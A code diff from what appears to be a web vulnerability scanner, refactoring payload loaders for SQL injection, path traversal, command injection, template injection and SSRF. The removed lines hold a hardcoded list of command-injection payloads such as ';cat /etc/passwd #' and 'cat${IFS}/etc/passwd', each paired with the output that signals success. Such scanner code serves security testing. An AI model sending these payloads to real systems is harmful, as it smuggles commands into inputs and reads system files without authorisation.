@@ -19,39 +19,20 @@ class XSS:
 
 sqli_payloads = open('wordlists/txt/sqli.txt','r')
 sql_err = open('wordlists/txt/sqli_errors.txt','r')
+traversal = open('wordlists/txt/traversal.txt','r')
 
-def rce_payloads(): 
-    f = {
-     ';id #':'gid=',
-     ';cat /etc/passwd #':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
-     '|id #':'gid=',
-     '|cat /etc/passwd #':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
-     '''
-id #''':'gid=',
-     '''
-cat /etc/passwd #''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
-      '''
-cat${IFS}/etc/passwd #''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
-      ';id':'gid=',
-      ';cat /etc/passwd':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
-      '|id':'gid=',
-      '|cat /etc/passwd':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
-      '''
-id''':'gid=',
-      '''
-cat /etc/passwd''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
-      '''
-cat${IFS}/etc/passwd''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin'
-      }
-
+def TLD():
+    f = open('wordlists/txt/tld.txt','r')
     return f
 
+def rce_payloads() -> dict: 
+    file = open('wordlists/match/rce.yaml','r')
+    return safe_load(file)
 
-def ssti_payloads():
-    f = safe_load(open('wordlists/match/ssti.yaml','r'))
-    return f
+
+def ssti_payloads() -> dict:
+    return safe_load(open('wordlists/match/ssti.yaml','r'))
 
 
-def ssrf_parameters():
-    f = open('wordlists/txt/ssrf_parameters.txt','r').read().splitlines() 
-    return f
+def ssrf_parameters() -> str:
+    return open('wordlists/txt/ssrf_parameters.txt','r').read().splitlines() 
